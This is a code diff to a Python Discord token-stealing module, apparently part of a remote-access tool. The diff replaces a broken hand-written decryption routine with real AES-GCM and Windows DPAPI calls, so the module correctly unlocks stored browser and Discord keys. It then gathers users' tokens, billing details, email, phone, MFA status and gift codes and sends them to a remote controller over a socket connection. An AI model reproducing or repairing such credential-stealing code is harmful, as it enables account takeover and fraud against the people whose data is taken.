@@ -3,9 +3,9 @@ import json
 import os
 import re
 import requests
-import hashlib
-import struct
+from Crypto.Cipher import AES
 from discord import Embed
+from win32crypt import CryptUnprotectData
 
 def run(sio, uuid):
     class grab_discord():
@@ -86,8 +86,6 @@ def run(sio, uuid):
                     for _file in files:
                         if not _file.endswith('.sqlite'):
                             continue
-                        if _file == "2399318504a8noyjc0o0d3e2_sl59.sqlite":
-                            continue
                         for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                             for token in re.findall(self.regexp, line):
                                 if self.validate_token(token):
@@ -101,95 +99,24 @@ def run(sio, uuid):
             if r.status_code == 200: return True
             return False
         
-        def xor_bytes(self, a, b):
-            return bytes(x ^ y for x, y in zip(a, b))
-
-        def gmac(self, h, auth_data, cipher_text):
-            def ghash(h, data):
-                y = 0
-                for i in range(0, len(data), 16):
-                    block = data[i:i+16].ljust(16, b'\x00')
-                    y ^= int.from_bytes(block, 'big')
-                    y = ((y * h) % (2**128))
-                return y.to_bytes(16, 'big')
-
-            def mul_in_gf128(x, y):
-                z = 0
-                for i in range(128):
-                    if y & (1 << i):
-                        z ^= x
-                    x = (x << 1) ^ ((x >> 127) * 0x87)
-                return z
-
-            h = int.from_bytes(h, 'big')
-            auth_tag = ghash(h, auth_data.ljust((len(auth_data) + 15) // 16 * 16, b'\x00'))
-            auth_tag = xor_bytes(auth_tag, ghash(h, cipher_text.ljust((len(cipher_text) + 15) // 16 * 16, b'\x00')))
-            auth_tag = xor_bytes(auth_tag, struct.pack('>QQ', len(auth_data) * 8, len(cipher_text) * 8))
-            return mul_in_gf128(int.from_bytes(auth_tag, 'big'), h).to_bytes(16, 'big')
-
-        def aes_encrypt_block(self, key, block):
-            # This is a placeholder for AES block encryption
-            # In a real implementation, you would need to implement the full AES algorithm here
-            return hashlib.sha256(key + block).digest()[:16]
-
         def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
             iv = buff[3:15]
             payload = buff[15:]
-            
-            # Generate the key schedule (this is a simplified version)
-            key_schedule = [master_key]
-            for i in range(10):
-                key_schedule.append(hashlib.sha256(key_schedule[-1]).digest()[:16])
-            
-            # Counter mode encryption
-            counter = int.from_bytes(iv, 'big')
-            keystream = b''
-            for i in range(0, len(payload), 16):
-                counter_bytes = counter.to_bytes(12, 'big')
-                keystream += self.aes_encrypt_block(key_schedule[0], counter_bytes + b'\x00\x00\x00\x01')
-                counter += 1
-            
-            # Decrypt the payload
-            decrypted = self.xor_bytes(payload, keystream[:len(payload)])
-            
-            # Verify the authentication tag (last 16 bytes)
-            auth_tag = decrypted[-16:]
-            decrypted = decrypted[:-16]
-            
-            # In GCM mode, you would normally verify the authentication tag here
-            # But since we don't have the associated data, we'll skip this step
-            
-            return decrypted.decode()
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
+            decrypted_pass = decrypted_pass[:-16].decode()
+            return decrypted_pass
 
-        def get_master_key(self, path: str) -> bytes:
-            if not os.path.exists(path):
-                return None
-            
-            with open(path, "r", encoding="utf-8") as f:
-                content = f.read()
-                if 'os_crypt' not in content:
-                    return None
-                
-                local_state = json.loads(content)
-                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
-                
-                # Instead of using CryptUnprotectData, we'll use a derived key
-                # This is NOT as secure as the original method
-                # Use a combination of system-specific information to create a key
-                system_info = (
-                    os.environ.get('COMPUTERNAME', '') +
-                    os.environ.get('USERNAME', '') +
-                    os.environ.get('PROCESSOR_IDENTIFIER', '') +
-                    os.environ.get('PROCESSOR_LEVEL', '')
-                ).encode('utf-8')
-                
-                derived_key = hashlib.pbkdf2_hmac('sha256', system_info, b'salt', 100000)
-                
-                # XOR the encrypted key with the derived key
-                master_key = bytes(a ^ b for a, b in zip(encrypted_key, derived_key))
-                
-                return master_key
+        def get_master_key(self, path: str) -> str:
+            if not os.path.exists(path): return
+            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read(): return
+            with open(path, "r", encoding="utf-8") as f: c = f.read()
+            local_state = json.loads(c)
+
+            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            master_key = master_key[5:]
+            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+            return master_key
 
     class fetch_tokens:
         def __init__(self):
@@ -288,5 +215,7 @@ def run(sio, uuid):
                     #final_to_return.append(f'Username: {username} ({user_id})\nToken: {token}\nNitro: {nitro}\nBilling: {payment_methods if payment_methods != "" else "None"}\nMFA: {mfa}\nEmail: {email if email != None else "None"}\nPhone: {phone if phone != None else "None"}\nHQ Guilds: {hq_guilds}\nGift codes: {codes}')
                     final_to_return.append(json.dumps({'username': username, 'token': token, 'nitro': nitro, 'billing': (payment_methods if payment_methods != "" else "None"), 'mfa': mfa, 'email': (email if email != None else "None"), 'phone': (phone if phone != None else "None"), 'hq_guilds': hq_guilds, 'gift_codes': codes}))
             return final_to_return
-    
-    sio.emit('download_file_return', {'uuid': uuid, 'file_name': "discord-token.txt", 'file': base64.b64encode(str(grab_discord().initialize()).encode('utf-8'))})
+        
+    x = grab_discord().initialize()
+    print(x)
+    sio.emit('download_file_return', {'uuid': uuid, 'file_name': "discord-token.txt", 'file': base64.b64encode(str(x).encode('utf-8'))})
